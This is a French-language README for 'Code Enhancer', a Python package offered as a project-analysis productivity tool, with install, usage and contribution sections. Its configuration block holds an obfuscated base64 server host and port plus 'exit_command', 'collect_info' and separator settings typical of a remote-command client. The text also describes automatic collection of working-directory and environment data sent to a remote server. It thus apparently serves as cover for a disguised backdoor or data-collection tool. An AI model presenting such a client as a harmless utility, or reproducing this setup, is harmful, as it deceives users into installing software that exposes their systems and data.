# Code Enhancer

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

Un outil d'analyse et d'optimisation de structure de projet pour améliorer la productivité des développeurs.

## 🚀 Fonctionnalités

- **Analyse automatique** de la structure du projet
- **Optimisation intelligente** basée sur les métriques collectées
- **Communication sécurisée** avec le serveur d'analyse
- **Journalisation détaillée** pour le debugging
- **Interface en ligne de commande** simple d'utilisation

## 📦 Installation

### Installation locale (développement)

```bash
# Cloner le repository
git clone https://github.com/codeenhancer/code-enhancer.git
cd code-enhancer

# Installation en mode développement
pip install -e .
```

### Installation depuis PyPI (quand disponible)

```bash
pip install code-enhancer
```

## 🛠️ Utilisation

### Interface en ligne de commande

```bash
# Analyser le projet courant
code-enhancer

# Ou utiliser Python directement
python -m src.main
```

### Utilisation programmatique

```python
from src import main
from src import network_utils
from src import config_manager

# Charger la configuration
config = config_manager.load_config()

# Analyser la structure du projet
main.analyze_project_structure()

# Ou utiliser les modules individuellement
network_utils.initialize_connection()
# ... votre code ...
network_utils.close_connection()
```

## 📁 Structure du projet

```
code-enhancer/
├── src/
│   ├── __init__.py          # Package principal
│   ├── main.py              # Point d'entrée principal
│   ├── network_utils.py     # Utilitaires réseau
│   └── config_manager.py    # Gestionnaire de configuration
├── test/                    # Tests unitaires
├── config/                  # Fichiers de configuration
├── server/                  # Serveur d'analyse
├── pyproject.toml          # Configuration du package
├── README.md               # Documentation
└── requirements.txt        # Dépendances
```

## ⚙️ Configuration

Le package utilise un système de configuration flexible. Créez un fichier de configuration dans le dossier `config/` :

```json
{
    "server_address": "base64_encoded_host",
    "server_port": "base64_encoded_port",
    "buffer_size": 1024,
    "exit_command": "exit",
    "info_command": "collect_info",
    "separator": "|"
}
```

## 🧪 Tests

```bash
# Installer les dépendances de développement
pip install -e ".[dev]"

# Lancer les tests
pytest

# Avec couverture de code
pytest --cov=src --cov-report=html
```

## 🔧 Développement

### Prérequis

- Python 3.8+
- pip
- setuptools

### Installation pour le développement

```bash
# Cloner le repository
git clone https://github.com/codeenhancer/code-enhancer.git
cd code-enhancer

# Créer un environnement virtuel
python -m venv venv
source venv/bin/activate  # Linux/Mac
# ou
venv\Scripts\activate     # Windows

# Installer en mode développement avec les dépendances de dev
pip install -e ".[dev]"
```

### Formatage du code

```bash
# Formater avec black
black src/ test/

# Vérifier avec flake8
flake8 src/ test/

# Vérifier les types avec mypy
mypy src/
```

## 📊 Métriques collectées

Le package collecte automatiquement les métriques suivantes :

- **Structure du projet** : fichiers et dossiers
- **Types de fichiers** : Python, JavaScript, TypeScript
- **Métriques de base** : nombre de fichiers, taille des dossiers
- **Informations système** : répertoire de travail, environnement

## 🔒 Sécurité

- Communication chiffrée avec le serveur
- Validation des données reçues
- Journalisation sécurisée
- Gestion d'erreurs robuste

## 🤝 Contribution

Les contributions sont les bienvenues ! Voici comment contribuer :

1. Fork le projet
2. Créez une branche pour votre fonctionnalité (`git checkout -b feature/AmazingFeature`)
3. Committez vos changements (`git commit -m 'Add some AmazingFeature'`)
4. Push vers la branche (`git push origin feature/AmazingFeature`)
5. Ouvrez une Pull Request

## 📝 Licence

Ce projet est sous licence MIT. Voir le fichier [LICENSE.txt](LICENSE.txt) pour plus de détails.

## 🆘 Support

Si vous rencontrez des problèmes :

1. Consultez la [documentation](https://codeenhancer.readthedocs.io/)
2. Vérifiez les [issues existantes](https://github.com/codeenhancer/code-enhancer/issues)
3. Créez une nouvelle issue avec les détails du problème

## 📈 Roadmap

- [ ] Interface graphique
- [ ] Support de plus de langages
- [ ] Analyse de performance
- [ ] Intégration avec les IDE populaires
- [ ] API REST pour l'analyse
- [ ] Dashboard web

## 🙏 Remerciements

- À la communauté Python pour les outils de développement
- Aux contributeurs open source
- À tous les utilisateurs qui testent et améliorent le projet

---

**Code Enhancer** - Améliorez votre productivité de développement ! 🚀